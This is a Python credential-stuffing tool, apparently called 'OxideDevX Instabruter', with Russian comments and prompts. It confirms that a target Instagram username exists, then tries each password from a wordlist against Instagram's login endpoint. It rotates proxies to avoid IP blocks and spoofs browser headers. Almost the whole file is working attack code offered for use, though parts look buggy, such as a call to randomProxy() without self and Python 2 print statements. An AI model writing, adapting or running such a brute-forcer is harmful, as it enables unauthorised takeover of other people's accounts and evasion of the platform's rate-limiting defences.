# подключим библиотеки
import requests
import json
import time
import os
import random
import sys

def Input(text):
	value = ''
	if sys.version_info.major > 2:
		value = input(text)
	else:
		value = raw_input(text)
	return str(value)

class Instabrute():
	def __init__(self, username, passwordsFile='pass.txt'):
		self.username = username
		self.CurrentProxy = ''
		self.UsedProxys = []
		self.passwordsFile = passwordsFile
		self.loadPasswords()
		self.IsUserExists()
#запрос разрешения на использование прокси(с отдельного файла подтягиваеться)
		UsePorxy = Input('[*] Вы желаете использовать прокси? (y/n): ').upper()
		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
			self.randomProxy()


	#Проверьте, существует ли файл паролей и проверьте, содержит ли он пароли
	def loadPasswords(self):
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				self.passwords = f.read().splitlines()
				passwordsNumber = len(self.passwords)
				if (passwordsNumber > 0):
					print ('[*] %s Пароли загружаются успешно....Скоро начну работу.) ' % passwordsNumber)
				else:
					print('Файл паролей пуст, добавьте в него пароли и перезапустите скрпит! ')
					Input('[*] Нажмите Enter, чтобы выйти ')
					exit()
		else:
			print ('Создайте файл паролей с нужным вам именем "%s"' % self.passwordsFile)
			Input('[*] Нажмите enter для выхода')
			exit()

	#Выбираем случайный прокси из файла proxy
	def randomProxy(self):
		plist = open('proxy.txt').read().splitlines()
		proxy = random.choice(plist)

		if not proxy in self.UsedProxys:
			self.CurrentProxy = proxy
			self.UsedProxys.append(proxy)
		try:
			print('')
			print('[*] Проверяю новый IP адресс')
			print ('[*] ВНИМАНИЕ! Ваш публчиный ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
		except Exception as e:
			print  ('[*] Не могу подключиться к данному прокси серверу "%s"' % proxy)
		print('')


	#Проверьте, существует ли имя пользователя на сервере Instagram
	def IsUserExists(self):
		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
		if (r.status_code == 404):
			print ('[*] Имя пользователя "%s" не обнаружено(проверьте правильность ввода имени пользователя и повторите попытку)' % username)
			Input('[*] Нажмите Enter чтобы завершить работу')
			exit()
		elif (r.status_code == 200):
			return True

	def Login(self, password):
		sess = requests.Session()

		if len(self.CurrentProxy) > 0:
			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }

		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		sess.headers.update({
			'UserAgent':'Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/533.30.2 (KHTML, like Gecko) Version/4.1 Safari/533.30.2',
			#лист юзер агентов следует внизу
		        #Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/533.30.2 (KHTML, like Gecko) Version/4.1 Safari/533.30.2
		        #Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_3 rv:5.0) Gecko/20211126 Firefox/36.0
		        #Mozilla/5.0 (Windows 98; sl-SI; rv:1.9.0.20) Gecko/20100626 Firefox/37.0
			#также их можно взять здесь https://generate-name.net/user-agent
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})

		r = sess.get('https://www.instagram.com/') 
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
		
		#парсим response
		data = json.loads(r.text)
		if (data['status'] == 'fail'):
			print (data['message'])

			UsePorxy = Input('[*] Вы хотите использовать прокси (y/n): ').upper()
			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
				print ('[$] После неудачи попробуйте использовать прокси.')
				randomProxy() 
			return False

		#возврат к сеансу, если пароль подходит
		if (data['authenticated'] == True):
			return sess 
		else:
			return False
			
			
os.system("clear")
os.system("figlet OxideDevX Instabruter")
print
print " Автор: OxideDevX "
print



instabrute = Instabrute(Input('Введи юзернейм(логин пользователя): '))

try:
	delayLoop = int(Input('[*] Введи задержку , между попытками перебора (в секундах:)): ')) 
except Exception as e:
	print ('[*] Ошибка, программное обеспечение использует значение по умолчанию "5" и хоть патчь меня, я не передумаю..')
	delayLoop = 5
print ('')



for password in instabrute.passwords:
	sess = instabrute.Login(password)
	if sess:
		print ('[*] Успешный вход в систему пользователя %s' % [instabrute.username,password])
	else:
		print ('[*] Пароль неверный [%s]' % password)

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		WantToExit = str(Input('Нажмите  y ИЛИ n для выхода: ')).upper()
		if (WantToExit == 'Y' or WantToExit == 'YES'):
			exit()
		else:
			continue
		
